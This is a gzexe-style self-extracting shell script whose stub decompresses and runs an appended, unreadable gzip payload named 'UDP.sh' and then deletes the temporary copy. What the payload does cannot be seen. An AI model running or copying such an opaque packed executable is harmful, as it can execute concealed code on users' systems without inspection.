#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�S4�gUDP.sh �U�R1}�W�ŵ2a�>Z�UTXQa��fzv�d�!���xfP�,,�R=�>���T��֖���K�PC/X�$K#i��W_�����7�e����`�A���tU#J���Y�n��F�c�V���O���"QFpu^}N%��\)(��(�7YE��V�GRw���:聞�.1=�[ӱ�\�'SaL*�l�g9��{�%���)c�.��Q��B��~n�ǌS��X�,�����Y!/Nǻ�k
JSĜ��i�e��P��H�@�e,�ӿѐ�º�7�Nl���76��������/��q3���i�;��èXôc���%3G��
����5?̱���f��콰k%��?ؕ05c?�0"��D0߿���,q�1/����;��̩�t ���Qc�-�U�j�������v�'2߅��̕��3�n�.-�XI����j�����OP�r4�����&�����y̢�y�*�Cە�QSK�"�脕�/G6�wa�2b{ �k�c7��Ŏ���i��5Ɠ�A���Y��l�Q��r+�79��-946-��.-
o��*�졻���n��d]��9��c�:Gʴ�o�|=A��P�UD���=�X�v�E-��}�GPGx5J���^��LJ�PP���aF9��X�G?�_ }��_�  